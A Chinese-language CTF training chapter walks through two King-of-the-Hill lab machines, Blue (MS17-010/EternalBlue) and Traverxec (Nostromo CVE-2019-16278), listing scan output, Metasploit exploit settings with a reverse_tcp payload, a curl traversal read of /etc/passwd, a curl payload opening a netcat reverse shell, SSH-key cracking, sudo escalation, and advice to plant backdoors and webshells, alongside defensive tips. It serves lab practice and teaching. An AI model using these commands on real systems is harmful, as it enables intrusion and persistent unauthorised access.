# 经典KotH靶机分析

### 7.1 经典靶机1：Blue（类MS17-010）

#### 7.1.1 靶机概述

**难度**：入门级
**操作系统**：Windows 7
**核心漏洞**：MS17-010（EternalBlue）
**特点**：经典的快速入侵靶机，适合KotH入门练习

#### 7.1.2 攻击流程

**第一步：端口扫描**
```
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds
```

**第二步：漏洞检测**
```bash
# 使用nmap脚本检测MS17-010
nmap -p 445 --script smb-vuln-ms17-010 <target>

# 使用Metasploit检测
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <target>
run
```

**第三步：漏洞利用**
```bash
# Metasploit利用模块
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
run
```

#### 7.1.3 KotH攻防要点

**进攻方要点：**
1. **速度优先**：这个靶机的漏洞利用非常简单，关键是谁更快
2. **持久化**：获取System权限后立即建立多个后门
3. **补丁安装**：安装MS17-010补丁，防止其他人用同样的方法入侵

**防守方要点：**
1. **打补丁**：最快的防御方式就是安装补丁
2. **防火墙**：阻止445端口的外部访问
3. **监控SMB连接**：监控445端口的异常连接

### 7.2 经典靶机2：Traverxec

#### 7.2.1 靶机概述

**难度**：中级
**操作系统**：Linux
**核心漏洞**：Nostromo Web服务器远程命令执行 + sudo提权
**特点**：需要多步攻击，攻防转换空间大

#### 7.2.2 攻击流程

**第一步：信息收集**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1
80/tcp open  http    nostromo 1.9.6
```

**第二步：Web服务器漏洞利用**
Nostromo 1.9.6存在目录遍历和远程命令执行漏洞（CVE-2019-16278）。

```bash
# 验证漏洞
curl http://<target>/..%2f..%2f..%2f..%2f..%2fetc/passwd

# 利用CVE-2019-16278获取Shell
curl -d "nc -e /bin/bash <your_ip> 4444" \
    "http://<target>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```

**第三步：权限提升**
```bash
# 枚举用户
cat /etc/passwd | grep sh$

# 查找用户目录
ls -la /home/david/

# 发现.nostromo目录，包含SSH密钥
# 破解SSH密钥密码
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=rockyou.txt

# 使用SSH登录
ssh -i id_rsa david@<target>

# 检查sudo权限
sudo -l
# 发现可以用sudo执行server-stats.sh

# 利用sudo提权
sudo /usr/bin/server-stats.sh
# 在脚本中插入命令，获取root shell
```

#### 7.2.3 KotH攻防要点

**进攻方要点：**
1. **快速识别Web服务器**：Nostromo比较少见，需要快速识别
2. **保留WebShell**：即使获得了SSH访问，也保留WebShell作为备用
3. **SSH密钥保护**：获取的私钥要保护好，防止被删除

**防守方要点：**
1. **Web服务器加固**：升级Nostromo或替换为其他Web服务器
2. **SSH密钥轮换**：定期更换用户的SSH密钥
3. **限制sudo权限**：严格控制sudo命令的使用
4. **监控cgi-bin**：监控对cgi-bin目录的异常访问

---

---

## 📋 内容审核与补充建议

> 针对「经典KotH靶机分析」部分的内容审核结果：

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
